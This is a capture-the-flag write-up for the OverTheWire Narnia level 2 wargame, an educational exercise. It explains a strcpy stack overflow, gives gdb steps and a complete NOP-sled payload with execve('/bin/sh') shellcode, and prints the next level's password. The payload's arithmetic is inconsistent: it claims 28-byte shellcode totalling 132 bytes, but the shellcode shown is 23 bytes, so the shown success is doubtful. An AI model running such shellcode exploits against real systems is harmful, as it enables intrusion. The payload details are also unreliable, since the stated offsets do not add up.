# Narnia Level 2 → 3

## Goal

`narnia2` takes `argv[1]` and `strcpy`s it straight into a 128-byte buffer — no bounds check. Standard stack buffer overflow: overflow the buffer, overwrite the saved return address with the address of shellcode you've placed at the start of the buffer.

## Concepts you'll learn

- The `strcpy` bug class — no length argument, stops at first NUL
- Locating the offset from buffer start to the saved return address in `gdb`
- NOP sleds and why they make the return-address guess tolerant to small drifts

## Walkthrough

### 1. Read the source

```c
int main(int argc, char *argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf, argv[1]);
    printf("%s", buf);
    return 0;
}
```

128-byte buffer, unbounded `strcpy`, value comes from `argv[1]`.

### 2. Find the offset to the saved return address

In `gdb`, crash the binary with a long input and read the EIP value:

```bash
$ gdb -q /narnia/narnia2
(gdb) run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*200)')
...
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

EIP is `0x41414141` — the return address was overwritten. The offset from the start of `buf` to the saved return address on this binary is **132 bytes** (128 for `buf` + 4 for the saved frame pointer). To pin that down precisely, use a cyclic pattern (`pwntools`' `cyclic` / Metasploit's `msf-pattern_create`).

### 3. Build the payload

Layout inside `buf`:

```
[ 104 NOP bytes ][ 28-byte shellcode ][ ... ][ return address (pointing into NOPs) ]
```

Total before the return address: 132 bytes, so 104 NOPs + 28 shellcode = 132.

Find a good return address by running the binary under `gdb`, breaking at `main`'s return, and dumping `$esp`:

```bash
(gdb) b *main+<offset-of-ret>
(gdb) run AAAA
(gdb) x/100wx $esp
```

Pick any address inside your NOP sled. Axcheron used `0xffffd824`. Build:

```bash
$ PAYLOAD=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*104 + b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80" + b"\x24\xd8\xff\xff")')
$ /narnia/narnia2 "$PAYLOAD"
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
vaequeezee
```

If it segfaults, the return address missed the sled. Widen the sled or pick an address further into its middle — you don't need to be exact, just inside.

## The answer

The password for `narnia3` is:

**`vaequeezee`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/narnia/narnia2.html>
